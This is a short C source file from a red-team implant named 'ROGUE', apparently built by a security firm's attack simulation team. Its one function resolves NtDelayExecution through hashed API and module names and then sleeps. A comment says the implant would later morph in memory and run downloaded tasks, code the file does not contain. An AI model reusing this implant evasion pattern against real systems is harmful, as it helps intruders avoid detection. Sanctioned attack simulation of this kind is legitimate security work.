/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtDelayExecution );
} API ;

/* API Hashes */
#define H_API_NTDELAYEXECUTION		0xf5a936aa /* NtDelayExecution */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Allow rogue to morph itself in memory, and go to 'sleep'
 * before awaking from its slumber to download more tasks
 * and execute them accordingly. Or, well, it will if you
 * add this code.
 *
!*/
D_SEC( B ) VOID Hide( _In_ UINT32 SleepTime )
{
	API		Api;
	LARGE_INTEGER	Del;

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Del, sizeof( Del ) );

	Api.NtDelayExecution = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTDELAYEXECUTION ) );

	/* 'Obfuscate' ourselves for a brief period */
	Del.QuadPart = -10000LL * SleepTime;
	Api.NtDelayExecution( FALSE, &Del );

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Del, sizeof( Del ) );
};
